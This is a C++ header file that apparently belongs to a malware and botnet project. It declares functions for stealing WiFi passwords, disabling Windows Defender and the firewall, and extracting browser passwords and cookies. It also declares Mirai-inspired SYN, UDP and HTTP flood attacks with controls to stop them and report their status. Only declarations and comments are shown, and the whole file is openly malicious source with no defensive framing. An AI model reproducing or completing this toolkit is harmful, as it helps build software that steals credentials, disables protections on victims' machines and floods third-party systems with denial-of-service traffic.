#pragma once
#include <string>

// --- Phase 3: Arsenal Toolkit ---

// 1. WiFi Stealer: Lists profiles and passwords
std::string steal_wifi();

// 2. AV Killer: Attempts to disable Windows Defender and Firewall using PowerShell
std::string av_kill();

// 3. Browser Data Stealer: Extracts passwords or cookies from Chrome/Edge using DPAPI & AES-GCM
// mode: "passwords" or "cookies"
std::string steal_browser_data(const std::string& mode);

// --- Phase 9: DDoS Arsenal (Mirai-Inspired) ---

// SYN Flood: Rapidly opens TCP connections to target:port for duration_sec
std::string attack_syn(const std::string& target, int port, int duration_sec);

// UDP Flood: Saturates target with UDP packets for duration_sec
std::string attack_udp(const std::string& target, int port, int duration_sec);

// HTTP Flood: Spams HTTP GET requests to target URL for duration_sec
std::string attack_http(const std::string& target_url, int duration_sec);

// Stop all running attacks
void attack_stop_all();

// Get attack status
std::string attack_status();

